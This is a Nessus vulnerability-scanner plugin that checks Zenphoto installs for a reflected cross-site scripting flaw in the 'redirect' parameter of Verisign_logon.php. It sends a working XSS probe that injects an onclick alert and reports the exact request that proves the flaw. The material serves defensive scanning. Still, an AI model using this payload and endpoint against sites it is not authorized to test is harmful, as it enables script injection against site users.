#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63073);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(56389);
  script_osvdb_id(87029);
  script_xref(name:"EDB-ID", value:"22524");

  script_name(english:"Zenphoto Verisign_logon.php redirect Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Zenphoto installed on the remote host is affected by a
cross-site scripting vulnerability because it fails to properly sanitize
user input to the 'redirect' parameter of the
'zp-core/zp-extensions/federated_logon/Verisign_logon.php' script.  An
attacker may be able to leverage this issue to inject arbitrary HTML and
script code into a user's browser to be executed within the security
context of the affected site. 

Note that the install is also likely affected by several additional
cross-site scripting issues as well as multiple SQL injections and other
vulnerabilities, although Nessus has not tested for those."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.waraxe.us/content-96.html");
  script_set_attribute(attribute:"see_also", value:"http://www.zenphoto.org/news/zenphoto-1.4.3.4");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.4.3.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/11/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zenphoto:zenphoto");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("zenphoto_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/zenphoto");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname:"zenphoto",
  port:port,
  exit_on_fail:TRUE
);

dir = install["dir"];
install_loc = build_url(port:port, qs:dir);
url = "/zp-core/zp-extensions/federated_logon/Verisign_logon.php?redirect=";
xss_test = '"+onclick=alert('+"'" +SCRIPT_NAME+'-'+unixtime()+"'" +')+w"';

res = http_send_recv3(
  port         : port,
  method       : "GET",
  item         : dir + url + urlencode(str:xss_test),
  exit_on_fail : TRUE
);

pass_str = '<a href="' + xss_test + '"';
output = extract_pattern_from_resp(string:res[2], pattern:'ST:'+pass_str);

if (pass_str >< res[2] && "Verisign user id:" >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to verify the issue using the following request :' +
      '\n' +
      '\n' + install_loc + url + xss_test +
      '\n' +
      '\n' + 'Note that clicking the "Return to Zenphoto" link will execute' +
      '\n' + 'the JavaScript code and display an alert box to demonstrate the' +
      '\n' + 'vulnerability.' +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following response :' +
        '\n' +
        '\n' + output +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Zenphoto", install_loc);
